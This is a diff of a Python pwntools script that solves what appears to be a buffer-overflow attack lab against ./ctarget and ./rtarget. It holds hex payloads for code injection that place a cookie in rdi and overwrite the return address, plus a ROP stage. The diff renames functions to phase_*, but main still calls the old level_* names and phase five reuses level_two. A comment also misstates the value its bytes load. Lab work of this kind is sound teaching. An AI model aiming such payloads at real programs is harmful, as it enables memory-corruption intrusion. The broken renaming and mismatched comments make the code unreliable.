@@ -13,7 +13,9 @@ COOKIE = 0x59b997fa
 BUFFER = 0x5561dc78
 STRING = 0x5561dcb0
 
-def level_one():
+## classic code injection
+
+def phase_one():
     """
     41 41 41 41 41 41 41 41 41 41  ; 40 bytes to overwrite
     41 41 41 41 41 41 41 41 41 41
@@ -27,7 +29,7 @@ def level_one():
     return payload
 
 
-def level_two():
+def phase_two():
     """
     48 c7 c7 fa 97 b9 59 c3 41 41  ; mov rdi, 0x59b997fa; ret // place cookie as first arg
     41 41 41 41 41 41 41 41 41 41
@@ -47,7 +49,7 @@ def level_two():
 def hextostring(data):
     return "".join([x for x in hex(data)[2:]])
 
-def level_three():
+def phase_three():
     """
     48 c7 c7 b0 dc 61 55 c3 41 41  ; mov rdi, 0x59b997fa; ret // place ptr to cookie as first arg
     41 41 41 41 41 41 41 41 41 41
@@ -66,7 +68,9 @@ def level_three():
     return payload
 
 
-def level_four():
+## ROP
+
+def phase_four():
     """
     41 41 41 41 41 41 41 41 41 41 41
     41 41 41 41 41 41 41 41 41 41 41
@@ -83,33 +87,33 @@ def level_four():
     return payload
 
 
-def level_five():
+def phase_five():
     payload = ""
     return payload
 
 
 def main():
-    # level one
+    # phase one
     io = process(argv=["./ctarget", "-q"])
     io.sendline(level_one())
     print io.recvall()
 
-    # level two
+    # phase two
     io = process(argv=["./ctarget", "-q"])
     io.sendline(level_two())
     print io.recvall()
 
-    # level three
+    # phase three
     io = process(argv=["./ctarget", "-q"])
     io.sendline(level_three())
     print io.recvall()
 
-    # level four
+    # phase four
     io = process(argv=["./rtarget", "-q"])
     io.sendline(level_four())
     print io.recvall()
 
-    # level five
+    # phase five
     io = process(argv=["./rtarget", "-q"])
     io.sendline(level_two())
     print io.recvall()
